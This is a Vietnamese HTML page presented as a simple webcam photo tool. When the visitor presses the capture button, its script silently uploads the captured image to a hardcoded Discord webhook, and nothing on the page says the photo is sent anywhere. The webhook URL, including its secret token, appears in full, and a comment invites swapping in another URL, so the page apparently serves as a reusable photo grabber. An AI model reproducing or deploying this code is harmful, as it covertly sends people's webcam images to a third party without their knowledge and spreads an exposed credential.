<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chụp Ảnh Webcam</title>
    <style>
        video {
            width: 100%;
            max-width: 600px;
            border: 1px solid black;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Chụp Ảnh Webcam</h1>
    <video id="video" autoplay></video>
    <button id="capture" disabled>Chụp Ảnh</button>
    <canvas id="canvas"></canvas>
    <img id="photo" alt="Chụp ảnh" />

    <script>
        // Thay đổi webhook URL ở đây
        const webhookUrl = 'https://discord.com/api/webhooks/1244143482591907953/vdZq7ZJIjnmJ_mFoQGDGN_AwAwdqQHqTRqy9V9p7ZLsddolQchX82v3PlVSpHKg9FCKN';

        // Lấy các phần tử
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const captureButton = document.getElementById('capture');

        // Khởi tạo webcam
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
                captureButton.disabled = false; // Bật nút chụp ảnh khi webcam sẵn sàng
            })
            .catch((err) => {
                console.error("Không thể truy cập webcam: ", err);
            });

        let isSending = false; // Biến trạng thái để theo dõi quá trình gửi ảnh

        // Chức năng chụp ảnh và gửi ảnh qua webhook
        captureButton.addEventListener('click', () => {
            if (isSending) return; // Ngăn chặn chụp ảnh khi đang gửi

            isSending = true; // Đánh dấu là đang gửi ảnh

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/png');
            photo.src = imageData;

            // Chuyển đổi base64 thành blob để gửi qua Discord
            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('file', blob, 'image.png');

                    // Gửi ảnh qua webhook Discord
                    fetch(webhookUrl, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Ảnh đã được gửi thành công!');
                        } else {
                            console.error('Lỗi khi gửi ảnh:', response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error('Lỗi mạng:', error);
                    })
                    .finally(() => {
                        isSending = false; // Đánh dấu là đã hoàn tất gửi ảnh
                    });
                })
                .catch(error => {
                    console.error('Lỗi khi chuyển đổi base64 thành blob:', error);
                    isSending = false; // Đánh dấu là đã hoàn tất gửi ảnh
                });
        });
    </script>
</body>
</html>
